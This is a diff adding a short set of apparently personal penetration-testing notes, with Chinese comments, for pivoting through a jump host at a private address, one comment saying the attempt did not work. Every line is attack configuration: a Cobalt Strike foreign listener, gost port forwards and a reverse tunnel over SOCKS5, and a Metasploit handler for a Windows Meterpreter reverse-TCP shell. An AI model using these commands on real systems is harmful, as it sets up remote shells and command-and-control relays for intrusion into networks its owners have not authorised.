@@ -1,0 +1,18 @@
+# 跳板机 192.168.183.129
+# 没成功
+
+
+CS_Listener: Foreign HTTP
+lhost 192.168.183.129
+
+# gost -L=tcp://:1234/192.168.50.80:1234 -L=tcp://:8080/192.168.50.80:8080
+
+
+# msf
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 1234
+run -j
+
+gost -L=rtcp://:1234/:1234 -F=socks5://192.168.183.129:2080
